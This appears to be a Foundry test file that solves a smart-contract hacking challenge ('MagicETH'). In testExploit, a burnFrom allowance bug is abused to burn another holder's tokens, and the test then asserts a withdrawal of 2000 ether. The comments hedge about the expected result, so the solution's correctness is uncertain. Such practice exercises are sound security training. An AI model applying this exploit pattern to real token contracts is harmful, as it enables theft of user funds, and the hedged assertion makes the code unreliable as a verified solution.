// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge1Test is Test {
    MagicETH public mETH;

    address public exploiter = makeAddr("exploiter");
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        mETH = new MagicETH();

        mETH.deposit{value: 1000 ether}();
        // exploiter is in control of 1000 tokens
        mETH.transfer(exploiter, 1000 ether);
    }

    function testExploit() public {

            vm.deal(whitehat, 1000 ether); // fund whitehat to deposit

vm.startPrank(whitehat);

// Approve exploiter to spend whitehat's tokens (bug requires this)
mETH.approve(exploiter, type(uint256).max);

// Burn exploiter's tokens to reduce totalSupply
mETH.burnFrom(exploiter, 1000 ether);

// Deposit 1000 ETH to get 1000 tokens for whitehat
mETH.deposit{value: 1000 ether}();

// Now whitehat owns 1000 tokens, withdraw them for ETH
mETH.withdraw(1000 ether);

vm.stopPrank();

// The ETH balance should now be (due to bug) more than 1000 ether, adjust assertion accordingly
assertEq(whitehat.balance, 2000 ether, "whitehat should have 2000 ether");

    }
}

